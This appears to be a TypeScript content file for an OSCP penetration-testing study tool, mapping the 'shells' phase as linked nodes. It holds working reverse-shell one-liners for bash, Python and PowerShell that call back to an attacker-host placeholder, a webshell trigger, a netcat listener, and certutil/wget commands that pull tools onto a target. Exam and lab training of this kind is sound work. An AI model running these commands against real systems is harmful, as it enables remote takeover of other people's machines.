import type { OscpContent } from '@/types/oscp'

/** Phase: getting and stabilising a shell, plus file transfer. */
const shells: OscpContent = {
    nodes: [
        {
            id: 'webshell-upload',
            title: 'Webshell live',
            type: 'state',
            phase: 'shells',
            os: 'agnostic',
            description:
                'You can run commands through the browser. Use it to fire a reverse-shell one-liner and catch an interactive session - a webshell alone is fragile.',
            commands: [
                {
                    label: 'Trigger a reverse shell from the webshell',
                    code: `# Linux target
curl "http://<target>/sh.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<kali-ip>/443+0>%261'"
# Windows target -> use a PowerShell one-liner (see Reverse shell)`,
                },
            ],
            tags: ['webshell', 'rce', 'trigger'],
        },
        {
            id: 'reverse-shell-catch',
            title: 'Catch a reverse shell',
            type: 'technique',
            phase: 'shells',
            os: 'agnostic',
            description:
                'Start a listener, then fire the matching one-liner from the target. Prefer 443/80 - egress filters usually allow them.',
            commands: [
                {
                    label: 'Listener',
                    code: 'rlwrap nc -lvnp 443',
                },
                {
                    label: 'Linux one-liners',
                    code: `bash -c 'bash -i >& /dev/tcp/<kali-ip>/443 0>&1'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<kali-ip>",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`,
                },
                {
                    label: 'Windows PowerShell one-liner',
                    code: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<kali-ip>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,$sb.Length)}"`,
                    note: 'Base64-encode (-enc) if quoting breaks it through the injection point.',
                },
            ],
            references: [
                {
                    label: 'revshells.com',
                    url: 'https://www.revshells.com/',
                },
            ],
            tags: ['reverse-shell', 'nc', 'listener', 'powershell', 'bash'],
        },
        {
            id: 'foothold-linux',
            title: 'Low-priv shell on Linux',
            type: 'state',
            phase: 'shells',
            os: 'linux',
            description:
                'You have code execution as a normal user. Stabilise the TTY, grab the user flag, then run privilege-escalation enumeration.',
            tags: ['foothold', 'linux', 'www-data', 'user'],
        },
        {
            id: 'foothold-windows',
            title: 'Shell on Windows',
            type: 'state',
            phase: 'shells',
            os: 'windows',
            description:
                'Code execution on a Windows host. Check `whoami /priv` and `whoami /groups` immediately - token privileges and group membership decide the fastest path up.',
            commands: [
                {
                    label: 'First look',
                    code: 'whoami /all\nsysteminfo\nnet user %username%',
                },
            ],
            tags: ['foothold', 'windows', 'whoami'],
        },
        {
            id: 'shell-upgrade',
            title: 'Stabilise the TTY',
            type: 'technique',
            phase: 'shells',
            os: 'linux',
            description:
                'Turn a dumb shell into a full PTY so Ctrl-C, arrows, tab and sudo work.',
            commands: [
                {
                    label: 'Full PTY upgrade',
                    code: `python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# then in the shell:
export TERM=xterm; stty rows 50 cols 200`,
                },
            ],
            tags: ['tty', 'pty', 'upgrade', 'stty'],
        },
        {
            id: 'file-transfer',
            title: 'Transfer tools to the target',
            type: 'technique',
            phase: 'shells',
            os: 'agnostic',
            description:
                'Host a file from Kali and pull it down. Needed for linpeas/winpeas, exploits and static binaries.',
            commands: [
                {
                    label: 'Serve from Kali',
                    code: 'python3 -m http.server 80   # or: impacket-smbserver share . -smb2support',
                },
                {
                    label: 'Pull down (Linux / Windows)',
                    code: `wget http://<kali-ip>/linpeas.sh -O /tmp/lp.sh
# Windows:
certutil -urlcache -f http://<kali-ip>/winpeas.exe wp.exe
iwr http://<kali-ip>/winpeas.exe -o wp.exe`,
                },
            ],
            tags: ['transfer', 'wget', 'certutil', 'smbserver', 'iwr'],
        },
    ],
    edges: [
        { from: 'webshell-upload', to: 'reverse-shell-catch', label: 'upgrade to reverse shell' },
        { from: 'reverse-shell-catch', to: 'foothold-linux', label: 'Linux caught' },
        { from: 'reverse-shell-catch', to: 'foothold-windows', label: 'Windows caught' },
        { from: 'foothold-linux', to: 'shell-upgrade', label: 'stabilise first' },
        { from: 'foothold-linux', to: 'privesc-enum-linux', label: 'enumerate for privesc' },
        { from: 'foothold-linux', to: 'file-transfer', label: 'need tools' },
        { from: 'foothold-windows', to: 'privesc-enum-windows', label: 'enumerate for privesc' },
        { from: 'foothold-windows', to: 'file-transfer', label: 'need tools' },
        { from: 'foothold-windows', to: 'ad-foothold', label: 'host is domain-joined' },
        { from: 'shell-upgrade', to: 'foothold-linux', label: 'now interactive' },
    ],
}

export default shells
